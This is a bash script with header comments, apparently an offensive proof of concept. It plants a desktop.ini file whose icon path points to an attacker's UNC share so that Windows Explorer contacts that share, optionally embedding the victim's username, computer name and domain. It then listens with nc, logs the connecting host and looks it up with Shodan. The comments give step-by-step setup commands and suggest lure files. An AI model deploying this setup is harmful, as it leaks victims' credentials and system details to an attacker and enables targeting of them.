#!/bin/bash

#       Simple remote UNC path TCP listener with Shodan CLI integration created by RGFulw - @EngineeringNeo
#
#       Main reasons why this script exists: -
#               - desktop.ini files automatically fetch IconResources from remote UNC paths.
#               - Allows Auto Remote Execution of Environment Variables also! - (well, outputs variable to server)
#               - Directory monitoring.
#               - File & Directory attributes remain between devices <== major issue "by-design"
#               - This script can be used for many other things...
#               - As easy as opening a "parent" directory to fully disclose user credentials and system variables
#
#
#       Requirements: -
#       ATTACKER
#               - shodan cli - `easy_install shodan && shodan init *API-KEY*`
#               - At least one TCP port to be available.
#       VICTIM
#               - Any Microsoft Windows Build *TESTED ON Win11 (Build 22000.675)* - Chances are Microsoft will never patch this:)))
#               - Windows Explorer.
#               - Basically anywhere which accepts UNC paths.
#
#
#       DEMO    https://youtu.be/OspAucei6ek **REUPLOAD PLANNED**
#
#
#       PoC - (folder & desktop.ini)
#       ====
#       secrets/
#               `mkdir secrets`
#               `attrib +s secrets`
#
#       secrets/desktop.ini
#               `echo [.ShellClassInfo] > desktop.ini`
#               `echo IconResource=\\UNC_PATH\neo >> desktop.ini`       *Change to \\%USERNAME%.%COMPUTERNAME%.%USERDOMAIN%.INI.UNC_PATH\neo for auto enviroment variable execution*
#               `attrib +s +h desktop.ini`
#
#       secrets/*
#               Feel free to include documents/programs to lure VICTIM
#       ====
#
#


#clear
read -p 'Enter Port to Listen on: ' port        #Some ports may require elevation

if [ "$port" == '' ]; then
        echo Please Enter a Valid Port Number to Listen on.
else

dns=$(nc -lvp $port 1>> output 2> output2 && grep Connection output2 | awk '{print $3}')        #Output DNS, not IP
ip=$(ping -c1 $dns > ip && grep PING ip | awk '{print $3}' | sed 's/^.\(.*\).$/\1/')    #Output IP from DNS

#echo $ip       #Debug Purposes
shodan host $ip #<<Feel Free to Edit

cat output2 >> output   #Paste Contents of 'output2' into 'output'
rm output2 ip   #Remove Unnecessary Files

fi
#clear